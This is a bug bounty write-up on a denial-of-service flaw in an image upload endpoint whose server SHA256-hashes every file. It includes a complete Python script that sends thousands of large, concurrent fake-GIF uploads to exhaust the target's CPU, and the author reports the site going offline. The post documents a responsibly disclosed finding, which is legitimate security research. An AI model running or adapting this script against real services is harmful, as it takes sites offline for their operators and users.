---
title: DoS via abusing the Upload Function
date: 2023-12-25
categories: [Writeup]
tags: [writeup, bugbounty, hackerone, hack, cybersecurity, bugbountytip, DOS, bugcrowd, web, pentest]
---


Greetings, Hope y'all good and fine!

Recently after finding [DoS via Password Strength Checker Function](https://sawmj.github.io/posts/DOS-via-password-strength-checker/), I found another interesting DoS vulnerability but in another function which is the upload function.

You can check my other DOS write-up here, 

![Alt text](/assets/img/dos-h1/2023-11-09_14-17.png)



This function is very unique as the application uses a method that is not very common


The application has a function that handles image upload to the S3 bucket and instead of letting the users to upload images directly to the s3 bucket, they let users upload images to the application server first and then the server upload the picture to the S3 bucket.

After testing it I figured out the following,

The function takes the uploaded file and it checks on the magic byte of the file to make sure that the uploaded image is one of the following PNG,JPEG or GIF. And then it renames it with random string and add extension to the file as what magic byte it detected and return with the file link from the S3 bucket after uploading it.


![Alt text](/assets/img/dos-h1/2023-11-08_22-59.png)


Now the question is where this file's name comes from?

From the look of it, It seems like a hash value!    
I needed to make further testing, First I need to make sure that this is indeed a hash value and what the exact content they are hashing, Second I need to figure out what kind of hash is this.

First by simply uploading the same file twice the same file's name get generated in the response. This makes it obvious they are hashing the content of the file    
Second, The generated file name is 64 char long which is probably SHA256 as expected and to be 100% sure I tried to hash the same content of the file using SHA256 and indeed it gave back the same value the server did in the file name.


Now we know exactly what happens in the background, How can we take advantage of this?

The answer is in the hashing function,  
Hashing takes processing power to compute and the larger the input the more process power it takes.

So the attack vector was very clear for me from this point, 
All I need is give the server hell of files to compute its hashes until the CPU chokes!

Now my theory is solid and all I need is to write a script to automate the process for me.

I wrote a python script that uploads many files simultaneously and concurrently that looks something like this:


```python
#!/usr/bin/env python3

import urllib3
import requests as req
from hurry.filesize import size
import concurrent.futures


urllib3.disable_warnings()
payload= "AZ"*300000
url= "https://upload-files.REDACTED.com/"
headers= {"Content-Type": "multipart/form-data; boundary=---------------------------10576330173106338099435430878"}


def make_request(payload):

  payload += "Z" * 100

  data = '-----------------------------10576330173106338099435430878\x0d\x0aContent-Disposition: form-data; name=\"data\"; filename=\"saw(1).pnsg\"\x0d\x0a\x0d\x0aGIF87a\x0d\x0asaw{}-----------------------------10576330173106338099435430878--'.format(payload)

  r = req.post(url, headers=headers, data=data, verify=False, timeout=50)

  return r


if __name__ == '__main__':
  with concurrent.futures.ThreadPoolExecutor(max_workers=300) as executor:
    futures = [executor.submit(make_request, payload) for i in range(15000)]

   
    for future in concurrent.futures.as_completed(futures):
      result = future.result()
      
      print(str(result.status_code) + "\t Length: " + size(len(payload)) + "\t" + result.headers['Location'] + " \t " + str(result.elapsed.total_seconds()) + " Seconds")
```

Running this code in a VPS with high bandwidth, It uploads many files to the server.  

After running the script, tried to reach the website from my machine got Gateway Time-out error from the reverse proxy:

![Alt text](/assets/img/dos-h1/2023-11-09_00-35.png)


And Violla as expected the server drowned in the hashing process and couldn't handle any other requests and went completely inaccessible no more.

I went ahead and wrapped a summary along with all PoCs and send a nice report to the program.

![Alt text](/assets/img/dos-h1/2023-11-09_14-17.png)


Unfortunately, this report was classified as medium severity because the program assessed the asset impact to be moderate, given that the vast majority of users don't frequently utilize the upload function.


![Alt text](/assets/img/dos-h1/2023-12-26_23-41.png)


